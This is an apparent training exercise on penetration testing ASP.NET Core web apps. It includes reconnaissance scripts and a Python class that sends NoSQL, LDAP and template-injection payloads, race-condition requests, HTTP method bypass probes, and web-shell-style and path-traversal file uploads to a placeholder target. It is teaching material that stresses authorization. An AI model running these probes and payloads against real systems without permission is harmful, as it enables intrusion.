# Exercise 5: Penetration Testing

## 🎯 Objective
Conduct hands-on penetration testing of ASP.NET Core applications using industry-standard tools and techniques to identify security vulnerabilities from an attacker's perspective.

## 📋 Requirements

### Part 1: Reconnaissance and Information Gathering
1. **Passive reconnaissance** using OSINT techniques
2. **Active reconnaissance** with scanning and enumeration
3. **Technology fingerprinting** and service identification
4. **Attack surface mapping** and entry point identification

### Part 2: Vulnerability Assessment
5. **Web application scanning** with automated tools
6. **Manual vulnerability testing** using custom payloads
7. **Business logic flaw identification** through manual testing
8. **API security testing** for REST/GraphQL endpoints

### Part 3: Exploitation and Post-Exploitation
9. **Vulnerability exploitation** with proof-of-concept attacks
10. **Privilege escalation** attempts within the application
11. **Data exfiltration** simulation and impact assessment
12. **Persistence mechanisms** and backdoor identification

### Part 4: Reporting and Documentation
13. **Comprehensive penetration test report** with findings
14. **Risk assessment** with CVSS scoring
15. **Proof-of-concept documentation** for each vulnerability
16. **Remediation recommendations** with implementation guidance

## 🛠️ Penetration Testing Methodology

### Phase 1: Pre-Engagement and Scoping

#### 1.1 Scope Definition
```markdown
# Penetration Test Scope Document

## Target Application
- **Application Name**: [Application Name]
- **URL**: https://target-application.com
- **IP Ranges**: [IP Ranges if applicable]
- **Testing Window**: [Date/Time Range]

## Testing Approach
- **Type**: Black Box / Gray Box / White Box
- **Methodology**: OWASP Testing Guide + PTES
- **Tools**: OWASP ZAP, Burp Suite, Custom Scripts
- **Exclusions**: Production data, DoS attacks, Physical access

## Success Criteria
- Identify all OWASP Top 10 vulnerabilities
- Test authentication and authorization mechanisms
- Assess input validation and output encoding
- Evaluate session management security
- Document all findings with PoC

## Legal Authorization
- Written authorization obtained: ✅
- Emergency contacts defined: ✅
- Escalation procedures established: ✅
```

#### 1.2 Testing Environment Setup
```bash
# Kali Linux penetration testing setup
apt update && apt upgrade -y

# Install additional tools
apt install -y \
    gobuster \
    dirbuster \
    nikto \
    sqlmap \
    wpscan \
    nuclei \
    subfinder \
    httpx

# Configure Burp Suite
mkdir -p ~/.java/.userPrefs/burp
echo "Burp Suite Professional setup completed"

# Configure OWASP ZAP
zap.sh -daemon -host 0.0.0.0 -port 8080 -config api.disablekey=true

# Set up custom wordlists
wget https://github.com/danielmiessler/SecLists/archive/master.zip
unzip master.zip -d /usr/share/wordlists/
```

### Phase 2: Information Gathering and Reconnaissance

#### 2.1 Passive Reconnaissance
```bash
#!/bin/bash
# Passive reconnaissance script

TARGET="target-application.com"
echo "Starting passive reconnaissance for $TARGET"

# WHOIS information
echo "=== WHOIS Information ===" > recon_report.txt
whois $TARGET >> recon_report.txt

# DNS enumeration
echo "=== DNS Records ===" >> recon_report.txt
dig $TARGET ANY >> recon_report.txt
dig $TARGET MX >> recon_report.txt
dig $TARGET TXT >> recon_report.txt

# Subdomain enumeration
echo "=== Subdomains ===" >> recon_report.txt
subfinder -d $TARGET -silent >> recon_report.txt
amass enum -passive -d $TARGET >> recon_report.txt

# Search engines
echo "=== Google Dorking ===" >> recon_report.txt
echo "site:$TARGET filetype:pdf" >> recon_report.txt
echo "site:$TARGET filetype:doc" >> recon_report.txt
echo "site:$TARGET inurl:admin" >> recon_report.txt
echo "site:$TARGET inurl:login" >> recon_report.txt

# Certificate transparency
echo "=== Certificate Transparency ===" >> recon_report.txt
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | jq -r '.[].name_value' | sort -u >> recon_report.txt

echo "Passive reconnaissance completed. Results saved to recon_report.txt"
```

#### 2.2 Manual Business Logic Testing
```python
# Advanced business logic testing framework
import requests
import re
import json
from urllib.parse import urljoin, urlparse
import base64
import hashlib
import time

class ManualPenTest:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.findings = []
        
    def test_business_logic_flaws(self):
        """Test for business logic vulnerabilities"""
        print("Testing business logic flaws")
        
        # Test price manipulation (e-commerce scenario)
        purchase_data = {
            "product_id": "123",
            "quantity": "1",
            "price": "-10.00"  # Negative price
        }
        
        response = self.session.post(
            urljoin(self.base_url, "/api/purchase"),
            json=purchase_data
        )
        
        if response.status_code == 200:
            self.findings.append({
                'type': 'Price Manipulation',
                'severity': 'Critical',
                'description': 'Application accepts negative prices',
                'proof_of_concept': f'POST /api/purchase with price: -10.00',
                'impact': 'Financial loss through negative pricing'
            })
            
        # Test quantity overflow
        overflow_data = {
            "product_id": "123",
            "quantity": "999999999999999999999",
            "price": "10.00"
        }
        
        response = self.session.post(
            urljoin(self.base_url, "/api/purchase"),
            json=overflow_data
        )
        
        # Check for integer overflow handling
        if response.status_code == 200:
            try:
                result = response.json()
                if 'total' in result and (result['total'] < 0 or result['total'] < 10):
                    self.findings.append({
                        'type': 'Integer Overflow',
                        'severity': 'High',
                        'description': 'Quantity overflow causes calculation errors',
                        'proof_of_concept': f'Large quantity causes total: {result.get("total")}',
                        'impact': 'Financial calculations compromised'
                    })
            except:
                pass
                
        # Test workflow bypass
        # Try to access step 3 without completing steps 1 and 2
        workflow_endpoints = [
            "/api/checkout/step1",
            "/api/checkout/step2", 
            "/api/checkout/step3",
            "/api/checkout/complete"
        ]
        
        # Skip to final step
        final_response = self.session.post(
            urljoin(self.base_url, "/api/checkout/complete"),
            json={"skip_validation": True}
        )
        
        if final_response.status_code == 200:
            self.findings.append({
                'type': 'Workflow Bypass',
                'severity': 'High', 
                'description': 'Can complete checkout without following proper workflow',
                'proof_of_concept': 'Direct POST to /api/checkout/complete bypasses validation',
                'impact': 'Business process integrity compromised'
            })
            
    def test_race_conditions(self):
        """Test for race condition vulnerabilities"""
        print("Testing race conditions")
        
        import threading
        import time
        
        # Test concurrent withdrawal (banking scenario)
        def withdraw_money(amount):
            return self.session.post(
                urljoin(self.base_url, "/api/account/withdraw"),
                json={"amount": amount}
            )
            
        # Perform concurrent withdrawals
        threads = []
        results = []
        
        for i in range(10):
            thread = threading.Thread(
                target=lambda: results.append(withdraw_money(100))
            )
            threads.append(thread)
            
        # Start all threads simultaneously
        for thread in threads:
            thread.start()
            
        # Wait for completion
        for thread in threads:
            thread.join()
            
        # Check if race condition allowed overdraft
        successful_withdrawals = sum(1 for r in results if r.status_code == 200)
        
        if successful_withdrawals > 5:  # Assuming account has $500
            self.findings.append({
                'type': 'Race Condition',
                'severity': 'Critical',
                'description': f'Race condition allows {successful_withdrawals} withdrawals',
                'proof_of_concept': 'Concurrent requests bypass balance checks',
                'impact': 'Account overdraft possible'
            })
            
    def test_api_security(self):
        """Test API-specific vulnerabilities"""
        print("Testing API security")
        
        # Test API versioning bypass
        api_versions = ['v1', 'v2', 'v3', 'beta', 'dev', 'test']
        
        for version in api_versions:
            test_url = urljoin(self.base_url, f"/api/{version}/admin/users")
            response = self.session.get(test_url)
            
            if response.status_code == 200:
                self.findings.append({
                    'type': 'API Version Exposure',
                    'severity': 'Medium',
                    'description': f'API version {version} exposes sensitive endpoints',
                    'proof_of_concept': f'GET /api/{version}/admin/users returns data',
                    'impact': 'Access to deprecated or debug API versions'
                })
                
        # Test HTTP method bypass
        protected_url = urljoin(self.base_url, "/api/admin/delete-user/123")
        
        # Try different HTTP methods
        methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS']
        
        for method in methods:
            response = self.session.request(method, protected_url)
            
            if response.status_code not in [401, 403, 405]:
                self.findings.append({
                    'type': 'HTTP Method Bypass',
                    'severity': 'High',
                    'description': f'{method} method bypasses access controls',
                    'proof_of_concept': f'{method} {protected_url} returns {response.status_code}',
                    'impact': 'Authorization bypass through method manipulation'
                })
                
        # Test parameter pollution
        polluted_params = {
            'user_id': ['123', '456'],  # Multiple values
            'action': 'delete'
        }
        
        response = self.session.post(
            urljoin(self.base_url, "/api/user/action"),
            data=polluted_params
        )
        
        # Check if parameter pollution causes unexpected behavior
        if response.status_code == 200:
            try:
                result = response.json()
                if 'deleted' in str(result).lower():
                    self.findings.append({
                        'type': 'Parameter Pollution',
                        'severity': 'Medium',
                        'description': 'Parameter pollution affects business logic',
                        'proof_of_concept': 'Multiple user_id values cause unexpected behavior',
                        'impact': 'Unintended actions on multiple resources'
                    })
            except:
                pass
                
    def test_advanced_injection(self):
        """Test advanced injection techniques"""
        print("Testing advanced injection vulnerabilities")
        
        # Test NoSQL injection
        nosql_payloads = [
            '{"$ne": null}',
            '{"$regex": ".*"}',
            '{"$where": "this.username == this.password"}',
            '{"$gt": ""}',
            '{"username": {"$ne": null}, "password": {"$ne": null}}'
        ]
        
        login_url = urljoin(self.base_url, "/api/auth/login")
        
        for payload in nosql_payloads:
            try:
                response = self.session.post(
                    login_url,
                    json=json.loads(payload),
                    headers={'Content-Type': 'application/json'}
                )
                
                if response.status_code == 200 and 'token' in response.text:
                    self.findings.append({
                        'type': 'NoSQL Injection',
                        'severity': 'Critical',
                        'description': f'NoSQL injection bypass with payload: {payload}',
                        'proof_of_concept': f'POST {login_url} with NoSQL payload',
                        'impact': 'Authentication bypass in NoSQL database'
                    })
                    break
            except:
                continue
                
        # Test LDAP injection
        ldap_payloads = [
            "admin)(&(objectClass=*))",
            "admin)(|(objectClass=*))",
            "admin)(&(password=*))(objectClass=*"
        ]
        
        search_url = urljoin(self.base_url, "/api/directory/search")
        
        for payload in ldap_payloads:
            response = self.session.get(search_url, params={'query': payload})
            
            if any(indicator in response.text.lower() for indicator in 
                   ['ldap', 'distinguished name', 'objectclass']):
                
                self.findings.append({
                    'type': 'LDAP Injection',
                    'severity': 'High',
                    'description': 'LDAP injection in directory search',
                    'proof_of_concept': f'GET {search_url}?query={payload}',
                    'impact': 'Directory information disclosure'
                })
                break
                
        # Test Server-Side Template Injection (SSTI)
        ssti_payloads = [
            "{{7*7}}",
            "${7*7}",
            "<%=7*7%>",
            "{{config.items()}}",
            "${{7*7}}",
            "#{7*7}"
        ]
        
        template_endpoints = [
            "/api/template/render",
            "/api/email/preview",
            "/api/report/generate"
        ]
        
        for endpoint in template_endpoints:
            for payload in ssti_payloads:
                response = self.session.post(
                    urljoin(self.base_url, endpoint),
                    json={'template': payload}
                )
                
                # Check if template was executed (7*7=49)
                if '49' in response.text:
                    self.findings.append({
                        'type': 'Server-Side Template Injection',
                        'severity': 'Critical',
                        'description': f'SSTI in {endpoint} with payload: {payload}',
                        'proof_of_concept': f'Template execution confirmed: {payload} = 49',
                        'impact': 'Remote code execution possible'
                    })
                    break
                    
    def test_file_upload_vulnerabilities(self):
        """Test file upload security"""
        print("Testing file upload vulnerabilities")
        
        upload_url = urljoin(self.base_url, "/api/files/upload")
        
        # Test malicious file uploads
        malicious_files = [
            {
                'filename': 'shell.aspx',
                'content': '<%@ Page Language="C#" %><%Response.Write("VULNERABLE");%>',
                'content_type': 'text/plain'
            },
            {
                'filename': 'shell.php',
                'content': '<?php echo "VULNERABLE"; ?>',
                'content_type': 'application/x-php'
            },
            {
                'filename': 'script.js',
                'content': 'alert("XSS")',
                'content_type': 'application/javascript'
            },
            {
                'filename': '../../../shell.aspx',
                'content': '<%@ Page Language="C#" %><%Response.Write("VULNERABLE");%>',
                'content_type': 'text/plain'
            }
        ]
        
        for file_data in malicious_files:
            files = {
                'file': (
                    file_data['filename'],
                    file_data['content'],
                    file_data['content_type']
                )
            }
            
            response = self.session.post(upload_url, files=files)
            
            if response.status_code == 200:
                try:
                    result = response.json()
                    file_path = result.get('path', '')
                    
                    # Try to access uploaded file
                    access_response = self.session.get(urljoin(self.base_url, file_path))
                    
                    if 'VULNERABLE' in access_response.text:
                        self.findings.append({
                            'type': 'Malicious File Upload',
                            'severity': 'Critical',
                            'description': f'Uploaded and executed: {file_data["filename"]}',
                            'proof_of_concept': f'File accessible at: {file_path}',
                            'impact': 'Remote code execution through file upload'
                        })
                except:
                    pass
                    
    def generate_pentest_report(self):
        """Generate comprehensive penetration test report"""
        print("Generating penetration test report")
        
        # Categorize findings by severity
        critical = [f for f in self.findings if f['severity'] == 'Critical']
        high = [f for f in self.findings if f['severity'] == 'High']
        medium = [f for f in self.findings if f['severity'] == 'Medium']
        low = [f for f in self.findings if f['severity'] == 'Low']
        
        # Calculate CVSS scores
        for finding in self.findings:
            finding['cvss_score'] = self.calculate_cvss_score(finding)
            
        # Generate HTML report
        html_report = self.generate_html_report(critical, high, medium, low)
        
        with open('penetration_test_report.html', 'w') as f:
            f.write(html_report)
            
        # Generate JSON report
        json_report = {
            'target': self.base_url,
            'test_date': time.strftime('%Y-%m-%d %H:%M:%S'),
            'methodology': 'OWASP Testing Guide v4.0',
            'scope': 'Web Application Penetration Test',
            'summary': {
                'total_findings': len(self.findings),
                'critical': len(critical),
                'high': len(high),
                'medium': len(medium),
                'low': len(low)
            },
            'findings': self.findings
        }
        
        with open('penetration_test_findings.json', 'w') as f:
            json.dump(json_report, f, indent=2)
            
        print("Penetration test reports generated!")
        
    def calculate_cvss_score(self, finding):
        """Calculate CVSS v3.1 score for finding"""
        # Simplified CVSS calculation
        severity_scores = {
            'Critical': 9.0,
            'High': 7.0,
            'Medium': 5.0,
            'Low': 2.0
        }
        
        base_score = severity_scores.get(finding['severity'], 0.0)
        
        # Adjust based on finding type
        if finding['type'] in ['SQL Injection', 'Command Injection', 'SSTI']:
            base_score = min(10.0, base_score + 1.0)
        elif finding['type'] in ['XSS', 'CSRF']:
            base_score = min(10.0, base_score + 0.5)
            
        return round(base_score, 1)
        
    def generate_html_report(self, critical, high, medium, low):
        """Generate HTML penetration test report"""
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Penetration Test Report</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; }}
                .header {{ background: #2c3e50; color: white; padding: 20px; }}
                .summary {{ background: #ecf0f1; padding: 15px; margin: 20px 0; }}
                .critical {{ border-left: 5px solid #e74c3c; }}
                .high {{ border-left: 5px solid #f39c12; }}
                .medium {{ border-left: 5px solid #f1c40f; }}
                .low {{ border-left: 5px solid #27ae60; }}
                .finding {{ margin: 20px 0; padding: 15px; background: #f8f9fa; }}
                .poc {{ background: #2c3e50; color: white; padding: 10px; font-family: monospace; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>Penetration Test Report</h1>
                <p>Target: {self.base_url}</p>
                <p>Date: {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
            </div>
            
            <div class="summary">
                <h2>Executive Summary</h2>
                <p>Total Findings: {len(self.findings)}</p>
                <ul>
                    <li>Critical: {len(critical)}</li>
                    <li>High: {len(high)}</li>
                    <li>Medium: {len(medium)}</li>
                    <li>Low: {len(low)}</li>
                </ul>
            </div>
            
            <h2>Detailed Findings</h2>
        """
        
        # Add findings by severity
        for severity, findings in [('Critical', critical), ('High', high), ('Medium', medium), ('Low', low)]:
            if findings:
                html += f"<h3>{severity} Risk Findings</h3>"
                for finding in findings:
                    html += f"""
                    <div class="finding {severity.lower()}">
                        <h4>{finding['type']}</h4>
                        <p><strong>CVSS Score:</strong> {finding.get('cvss_score', 'N/A')}</p>
                        <p><strong>Description:</strong> {finding['description']}</p>
                        <p><strong>Impact:</strong> {finding['impact']}</p>
                        <div class="poc">
                            <strong>Proof of Concept:</strong><br>
                            {finding['proof_of_concept']}
                        </div>
                    </div>
                    """
        
        html += """
            </body>
        </html>
        """
        
        return html
        
    def run_comprehensive_pentest(self):
        """Execute complete penetration test suite"""
        print(f"Starting comprehensive penetration test of {self.base_url}")
        
        # Execute all test modules
        self.test_business_logic_flaws()
        self.test_race_conditions()
        self.test_api_security()
        self.test_advanced_injection()
        self.test_file_upload_vulnerabilities()
        
        # Generate reports
        self.generate_pentest_report()
        
        print(f"Penetration test completed! Found {len(self.findings)} vulnerabilities.")
        return self.findings

# Usage
if __name__ == "__main__":
    target = "https://target-application.com"
    pentest = ManualPenTest(target)
    findings = pentest.run_comprehensive_pentest()
```

## 🎯 Validation Criteria

### ✅ Reconnaissance (20 points)
- [ ] Comprehensive passive reconnaissance completed
- [ ] Active scanning and enumeration performed
- [ ] Technology stack identified
- [ ] Attack surface mapped
- [ ] Entry points documented

### ✅ Vulnerability Assessment (30 points)
- [ ] Automated scanning with multiple tools
- [ ] Manual testing of OWASP Top 10
- [ ] Business logic vulnerabilities identified
- [ ] API security thoroughly tested
- [ ] Custom attack vectors developed

### ✅ Exploitation (30 points)
- [ ] Proof-of-concept exploits developed
- [ ] Impact assessment completed
- [ ] Privilege escalation attempted
- [ ] Data exfiltration simulated
- [ ] Post-exploitation activities documented

### ✅ Reporting (20 points)
- [ ] Comprehensive report generated
- [ ] CVSS scoring applied
- [ ] Clear remediation guidance provided
- [ ] Executive summary included
- [ ] Technical details sufficient for developers

## 🛠️ Required Tools

### Web Application Scanners
- **OWASP ZAP**: Comprehensive web app scanner
- **Burp Suite Professional**: Advanced web testing platform
- **Nikto**: Web server scanner
- **w3af**: Web application attack and audit framework

### Specialized Tools
- **SQLMap**: SQL injection testing tool
- **XSSer**: Cross-site scripting testing
- **Commix**: Command injection testing
- **NoSQLMap**: NoSQL injection testing

### Infrastructure Tools
- **Nmap**: Network discovery and security auditing
- **Masscan**: High-speed port scanner
- **testssl.sh**: SSL/TLS configuration testing
- **SSLyze**: SSL configuration analyzer

### Custom Tools
- **Custom Python scripts** for business logic testing
- **Postman/Newman** for API testing automation
- **Browser extensions** for manual testing

## 📋 Testing Checklist

### Pre-Engagement
- [ ] Scope clearly defined and approved
- [ ] Legal authorization obtained
- [ ] Testing environment prepared
- [ ] Emergency contacts established
- [ ] Rules of engagement agreed upon

### Information Gathering
- [ ] OSINT reconnaissance completed
- [ ] Technology fingerprinting done
- [ ] Attack surface mapped
- [ ] Entry points identified
- [ ] Initial vulnerability assessment

### Vulnerability Testing
- [ ] Authentication mechanisms tested
- [ ] Authorization controls evaluated
- [ ] Input validation assessed
- [ ] Session management reviewed
- [ ] Business logic examined

### Exploitation
- [ ] Proof-of-concept exploits developed
- [ ] Impact assessment completed
- [ ] Privilege escalation attempted
- [ ] Data access tested
- [ ] Persistence mechanisms identified

### Reporting
- [ ] Findings documented with evidence
- [ ] Risk ratings assigned
- [ ] Remediation guidance provided
- [ ] Executive summary prepared
- [ ] Technical appendix included

## 🚨 Ethical Considerations

### Legal Requirements
- **Written Authorization**: Always obtain explicit written permission
- **Scope Limitations**: Stay within defined testing boundaries
- **Data Protection**: Do not access or modify production data
- **Disclosure**: Report vulnerabilities responsibly

### Professional Standards
- **Minimize Impact**: Avoid disrupting business operations
- **Confidentiality**: Protect client information and findings
- **Accuracy**: Ensure findings are verified and reproducible
- **Constructive Approach**: Focus on helping improve security

## 💡 Pro Tips

1. **Start with Reconnaissance**: Good intelligence leads to better results
2. **Automate What You Can**: Use tools for efficiency, manual testing for depth
3. **Think Like an Attacker**: Consider business impact and real-world scenarios
4. **Document Everything**: Maintain detailed notes and evidence
5. **Verify Findings**: Ensure vulnerabilities are real and reproducible
6. **Prioritize by Risk**: Focus on vulnerabilities with highest business impact
7. **Provide Solutions**: Include specific remediation guidance

## 📚 Resources

### Methodologies
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PTES (Penetration Testing Execution Standard)](http://www.pentest-standard.org/)
- [NIST SP 800-115](https://csrc.nist.gov/publications/detail/sp/800-115/final)

### Tools Documentation
- [OWASP ZAP User Guide](https://www.zaproxy.org/docs/)
- [Burp Suite Documentation](https://portswigger.net/burp/documentation)
- [SQLMap User Manual](https://github.com/sqlmapproject/sqlmap/wiki)

### Training Resources
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/)
- [Damn Vulnerable Web Application (DVWA)](https://dvwa.co.uk/)

---

**Estimated Time**: 60-80 hours (depending on application complexity)  
**Difficulty**: Advanced  
**Prerequisites**: Strong understanding of web technologies and security concepts

**Remember**: Penetration testing requires explicit authorization and should only be performed on systems you own or have written permission to test! ⚖️
